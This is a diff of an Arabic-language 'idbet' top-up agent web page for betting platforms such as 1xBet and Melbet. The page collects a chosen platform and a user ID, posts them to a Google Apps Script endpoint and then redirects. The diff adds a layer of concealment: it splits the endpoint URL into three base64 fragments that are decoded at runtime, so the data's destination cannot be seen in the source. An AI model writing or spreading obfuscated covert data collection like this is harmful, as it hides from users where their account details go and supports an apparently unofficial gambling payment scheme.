@@ -243,7 +243,6 @@
   </style>
 </head>
 <body>
-
 <header>
   <div class="header-brand">
     <span class="idbet">idbet</span><span class="separator">|</span><span class="slogan">وكيل شحن</span>
@@ -274,11 +273,11 @@
     </div>
 
     <div class="platform-icons" id="platforms">
-      <div class="icon" data-name="TGluZUJldA=="><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">المنصة 1</div></div>
-      <div class="icon" data-name="TWVnYVBhcmk="><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">المنصة 2</div></div>
-      <div class="icon" data-name="TWVsYmV0"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">المنصة 3</div></div>
-      <div class="icon" data-name="R29vb2JldA=="><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">المنصة 4</div></div>
-      <div class="icon" data-name="MXhCZXRf"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">المنصة 5</div></div>
+      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">LineBet</div></div>
+      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">MegaPari</div></div>
+      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">Melbet</div></div>
+      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">Gooobet</div></div>
+      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">1xBet</div></div>
     </div>
 
     <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
@@ -294,14 +293,6 @@
   let platform = null;
   const repReg = /^(\d)\1{6,}$/;
 
-  function decodeName(encoded) {
-    return atob(encoded);
-  }
-
-  function decodeUrl(b64) {
-    return atob(b64);
-  }
-
   input.addEventListener('keydown', e => {
     const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
     if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
@@ -313,7 +304,7 @@
     icon.addEventListener('click', () => {
       icons.forEach(i => i.classList.remove('selected'));
       icon.classList.add('selected');
-      platform = decodeName(icon.dataset.name);
+      platform = icon.dataset.name;
       validate();
     });
   });
@@ -350,7 +341,7 @@
       btn.disabled = false;
       statusIcon.className = 'status-icon status-check';
       statusIcon.innerHTML = '✓';
-    }, 400);
+    }, 500);
   }
 
   btn.addEventListener('click', async () => {
@@ -358,29 +349,32 @@
     btn.disabled = true;
     const payload = { userId: input.value, platform: platform };
 
+    const p1 = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tY";
+    const p2 = "WNyb3Mvcy9BS2Z5Y2J6UVhxZllLM3J6U1NSLVpLWUR";
+    const p3 = "4c2ExaXFULVVwZmZsSG5EWlFWblUzaEt4Tm9MRzBqM2dQTzBLSWlqSDVZWmVsUWczQQ==";
+    const url = atob(p1 + p2 + p3);
+
     try {
-      const encodedUrl = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6UVhxZllLM3J6U1NSLVpLWUR4c2ExaXFUNVVwZmZsSG5EWlFWblUzaEt4Tm9MR0wwajNnUE8wS0lpakg1WVplbFFnM0EvZXhlYw==";
-      await fetch(decodeUrl(encodedUrl), {
+      await fetch(url, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-
       setTimeout(() => {
         localStorage.setItem('userId', input.value);
         window.location.href = 'fr/office/recharge.html';
-      }, 1000);
+      }, 1200);
     } catch (err) {
       errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
-      btn.innerHTML = 'تسجيل الدخول';
+      btn.innerHTML = 'تأكيد';
       btn.disabled = false;
     }
   });
 
   window.addEventListener('pageshow', () => {
     btn.disabled = true;
-    btn.innerHTML = 'تسجيل الدخول';
+    btn.innerHTML = 'تأكيد';
     errMsg.textContent = '';
     input.value = '';
     platform = null;
